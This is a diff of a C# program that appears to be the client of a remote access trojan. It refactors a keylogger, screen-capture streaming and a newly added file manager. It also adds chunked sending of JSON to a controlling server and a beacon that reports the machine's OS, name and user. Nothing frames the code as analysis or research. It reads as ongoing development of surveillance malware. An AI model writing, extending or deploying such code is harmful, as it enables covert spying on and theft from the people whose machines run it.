@@ -21,7 +21,11 @@ class Program
     #region Features
     static ScreenViewer screenViewer = new ScreenViewer(bufferSize, SendJson);
     static KeyLogger keyLogger = new KeyLogger();
+    static FileManager fileManager = new FileManager(SendJson);
     #endregion
+
+    public delegate void MessageReceivedHandler(dynamic message);
+    public static event MessageReceivedHandler MessageReceived;
 
     static void Main(string[] args)
     {
@@ -46,6 +50,7 @@ class Program
                 dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);
 
                 HandleResponse(responseJson);
+                MessageReceived?.Invoke(responseJson);
             }
         }
         catch (Exception e)
@@ -63,23 +68,8 @@ class Program
     {
         switch (responseJson["type"].ToString())
         {
-            case "message":
-                Console.WriteLine("Received: {0}", responseJson["text"]);
-                break;
             case "heartbeat":
-                SendHeartbeatResponse();
-                break;
-            case "set_interval":
-                screenViewer.SetIntervalAndStartSendingScreenshots((int)responseJson["interval"]);
-                break;
-            case "stop_screenshots":
-                screenViewer.StopSendingScreenshots();
-                break;
-            case "start_keylogger":
-                KeyLogger.Start();
-                break;
-            case "stop_keylogger":
-                KeyLogger.Stop();
+                SendJson(new { type = "heartbeat", text = "pong" });
                 break;
         }
     }
@@ -97,47 +87,28 @@ class Program
     {
         string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
         byte[] data = Encoding.UTF8.GetBytes(jsonString);
-        stream.Write(data, 0, data.Length);
+        int bytesSent = 0;
+        int bytesLeft = data.Length;
+
+        while (bytesLeft > 0)
+        {
+            int chunkSize = Math.Min(bufferSize, bytesLeft);
+            stream.Write(data, bytesSent, chunkSize);
+            bytesSent += chunkSize;
+            bytesLeft -= chunkSize;
+        }
     }
 
     static void SendInfo()
     {
-        var osInfo = GetOS();
-        string pc = GetPC();
-        string user = GetUser();
-
+        var osInfo = new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
         var jsonOSInfo = new
         {
-            type = "info",
+            type = "system_info",
             os = osInfo.Item1 + " " + osInfo.Item2,
-            pc = pc,
-            user = user
+            pc = Environment.MachineName,
+            user = Environment.UserName
         };
         SendJson(jsonOSInfo);
-    }
-
-    static void SendHeartbeatResponse()
-    {
-        var heartbeatResponse = new
-        {
-            type = "heartbeat",
-            text = "pong"
-        };
-        SendJson(heartbeatResponse);
-    }
-
-    static string GetPC()
-    {
-        return Environment.MachineName;
-    }
-
-    static Tuple<string, string> GetOS()
-    {
-        return new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
-    }
-
-    static string GetUser()
-    {
-        return Environment.UserName;
     }
 }
